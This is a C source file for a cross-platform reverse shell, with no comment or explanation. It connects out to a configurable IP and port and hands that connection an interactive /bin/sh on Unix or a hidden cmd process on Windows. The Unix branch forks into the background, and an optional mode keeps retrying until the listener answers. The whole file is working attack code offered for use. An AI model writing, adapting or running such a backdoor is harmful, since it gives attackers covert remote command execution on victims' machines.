#ifndef WIN32
# include <sys/socket.h>
# include <unistd.h>
# include <netinet/in.h>
# include <arpa/inet.h>
#else
# include <winsock2.h>
# include <windows.h>
# include <io.h>
# include <process.h>
#endif

#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

/* ================================================== */
/* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
/* ================================================== */
#define CLIENT_IP "0.0.0.0"
#define CLIENT_PORT (int)0
/* ================================================== */

int main(void) {
#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
	write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
	return (1);
#endif

#ifndef WIN32
	pid_t pid = fork();
	if (pid == -1) {
		write(2, "[ERROR] fork failed.\n", 21);
		return (1);
	}
	if (pid > 0) {
		return (0);
	}
#else
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSASturtup failed.\n", 28);
		return (1);
	}
#endif

	int port = CLIENT_PORT;
	struct sockaddr_in sa;

#ifndef WIN32
	int sockt = socket(AF_INET, SOCK_STREAM, 0);
#else
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
#endif
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

#ifdef WAIT_FOR_CLIENT
	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
# ifndef WIN32
		sleep(5);
# else
		Sleep(5000);
# endif
	}
#else
	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		write(2, "[ERROR] connect failed.\n", 24);
		return (1);
	}
#endif

#ifndef WIN32
	dup2(sockt, 0);
	dup2(sockt, 1);
	dup2(sockt, 2);
	char * const argv[] = {"/bin/sh", NULL};
	execve("/bin/sh", argv, NULL);
#else
	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
#endif

	return (0);
}
